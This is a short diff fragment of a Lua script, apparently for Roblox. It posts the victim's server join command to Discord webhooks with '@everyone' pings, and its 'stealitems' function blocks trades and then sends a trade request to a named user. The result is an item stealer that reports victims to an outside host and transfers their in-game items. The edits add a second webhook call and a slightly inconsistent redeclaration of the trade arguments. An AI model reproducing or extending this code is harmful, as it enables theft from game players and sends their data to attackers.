@@ -1097,7 +1097,9 @@ local webHookEmbed = CreateEmbed(
 )
 
 
-SendWebhook(WebHook, webHook, {content = '-- @everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
+SendWebhook(webHook, {content = '-- @everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
+
+SendWebhook(WebHook, {content = '-- @everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
 
 local function stealitems()
     coroutine.resume(destroytrades2)
@@ -1105,7 +1107,9 @@ local function stealitems()
     local sendArgs = {
         [1] = game:GetService("Players")[userName]
     }
-    game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(sendArgs))
+      local sendArgs = {
+        [1] = game:GetService("Players")[UserName]
+    } game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(sendArgs))
 
     wait(3)
 
